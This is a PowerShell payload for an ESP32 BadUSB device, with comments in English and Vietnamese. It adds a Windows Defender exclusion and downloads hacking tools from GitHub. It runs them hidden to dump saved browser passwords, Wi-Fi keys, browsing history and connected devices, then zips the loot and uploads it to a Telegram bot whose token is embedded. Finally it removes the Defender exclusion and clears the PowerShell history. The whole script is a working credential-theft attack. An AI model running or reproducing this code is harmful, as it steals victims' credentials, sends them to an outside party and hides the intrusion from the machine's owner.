#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\$env:USERNAME\Downloads"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# Download necessary tools
# Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
# Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
# Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
# Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
# Tải duy nhất 1 file

$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
Invoke-WebRequest $zipUrl -OutFile "tools.zip"

# Giải nén ngay lập tức (các file .exe sẽ tự động bung ra tại thư mục hiện tại)
Expand-Archive -Path "tools.zip" -DestinationPath "." -Force

# Execute tools to gather data (chạy tuần tự)
# .\WNetWatcher.exe /stext connected_devices.txt
# .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
# .\WebBrowserPassView.exe /stext passwords.txt
# .\WirelessKeyView.exe /stext wifi.txt

# CHẠY ĐA LUỒNG: Kích hoạt 4 công cụ quét cùng một lúc (Background Jobs)
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden

# Wait for the files to be fully written (Ép xung kiểm tra mỗi 100ms)
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Milliseconds 100
}

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Milliseconds 100
}




# Telegram configuration
$token = "8671014944:AAEfUUYGPdYuhVHYdBKq1EFqoNLbPMS99QQ"
$chatID = "8688296089"
$uri = "https://api.telegram.org/bot$token/sendDocument"
$caption = "Here are exfiltrated informations from $env:USERNAME"

# Check if the file exists before sending
if (!(Test-Path $dumpFile)) {
    exit 1
}

# Ensure System.Net.Http is available
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) {
        Add-Type -Path $httpPath
    } else {
        exit 1
    }
}

# Create HTTP client
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

# Attach the ZIP file
$filename = [System.IO.Path]::GetFileName("$dumpFile")
$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "document", $filename)

# Send data to Telegram
try {
    $client.PostAsync($uri, $content).Wait()
} catch {}

# ===============================================================================
# [THÊM MỚI] GỬI TÍN HIỆU "DONE" QUA CỔNG COM ĐỂ ESP32 NHÁY ĐÈN
# ===============================================================================
try {
    # Quét tất cả các cổng COM đang cắm trên máy tính
    $ports = [System.IO.Ports.SerialPort]::GetPortNames()
    foreach ($p in $ports) {
        # Bắn chữ DONE vào cổng với tốc độ 115200 (khớp với ESP32)
        $port = New-Object System.IO.Ports.SerialPort $p, 115200, None, 8, One
        $port.Open()
        $port.WriteLine("DONE")
        $port.Close()
    }
} catch {}
# ===============================================================================

# Cleanup
$fileStream.Close()
$fileStream.Dispose()

Set-Location C:\Users\$env:USERNAME\Downloads

# ===============================================================================
# [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
# ===============================================================================
Remove-Item -Recurse -Force scripts
Remove-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads" -Force
# ===============================================================================

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit